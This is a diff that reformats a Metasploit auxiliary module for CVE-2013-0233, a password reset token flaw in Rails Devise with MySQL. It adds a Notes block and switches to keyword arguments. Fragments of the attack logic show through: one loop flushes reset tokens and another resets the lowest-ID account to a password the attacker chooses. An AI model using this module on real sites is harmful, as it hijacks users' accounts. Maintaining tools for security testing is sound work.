@@ -35,15 +35,20 @@ class MetasploitModule < Msf::Auxiliary
         ],
         'License' => MSF_LICENSE,
         'References' => [
-          [ 'CVE', '2013-0233'],
-          [ 'OSVDB', '89642' ],
-          [ 'BID', '57577' ],
-          [ 'URL', 'http://blog.plataformatec.com.br/2013/01/security-announcement-devise-v2-2-3-v2-1-3-v2-0-5-and-v1-5-3-released/'],
-          [ 'URL', 'http://www.phenoelit.org/blog/archives/2013/02/05/mysql_madness_and_rails/index.html'],
-          [ 'URL', 'https://github.com/rails/rails/commit/921a296a3390192a71abeec6d9a035cc6d1865c8' ],
-          [ 'URL', 'https://github.com/rails/rails/commit/26e13c3ca71cbc7859cc4c51e64f3981865985d8']
+          ['CVE', '2013-0233'],
+          ['OSVDB', '89642'],
+          ['BID', '57577'],
+          ['URL', 'http://blog.plataformatec.com.br/2013/01/security-announcement-devise-v2-2-3-v2-1-3-v2-0-5-and-v1-5-3-released/'],
+          ['URL', 'http://www.phenoelit.org/blog/archives/2013/02/05/mysql_madness_and_rails/index.html'],
+          ['URL', 'https://github.com/rails/rails/commit/921a296a3390192a71abeec6d9a035cc6d1865c8'],
+          ['URL', 'https://github.com/rails/rails/commit/26e13c3ca71cbc7859cc4c51e64f3981865985d8']
         ],
-        'DisclosureDate' => '2013-01-28'
+        'DisclosureDate' => '2013-01-28',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES],
+          'Reliability' => []
+        }
       )
     )
 
@@ -89,13 +94,13 @@ class MetasploitModule < Msf::Auxiliary
     count = 0
     status = true
     until (status == false)
-      status = reset_one(Rex::Text.rand_text_alpha(rand(5..14)))
+      status = reset_one(Rex::Text.rand_text_alpha(5..14))
       count += 1 if status
     end
     vprint_status("Cleared #{count} tokens")
   end
 
-  def reset_one(password, report = false)
+  def reset_one(password, report: false)
     (0..datastore['MAXINT']).each do |int_to_try|
       encode_pass = REXML::Text.new(password).to_s
 
@@ -159,7 +164,7 @@ class MetasploitModule < Msf::Auxiliary
     # Reset a password.  We're racing users creating other reset tokens.
     # If we didn't flush, we'll reset the account with the lowest ID that has a token.
     print_status("Resetting password to \"#{datastore['PASSWORD']}\"...")
-    status = reset_one(datastore['PASSWORD'], true)
+    status = reset_one(datastore['PASSWORD'], report: true)
     status ? print_good('Password reset worked successfully') : print_error('Failed to reset password')
   end
 end
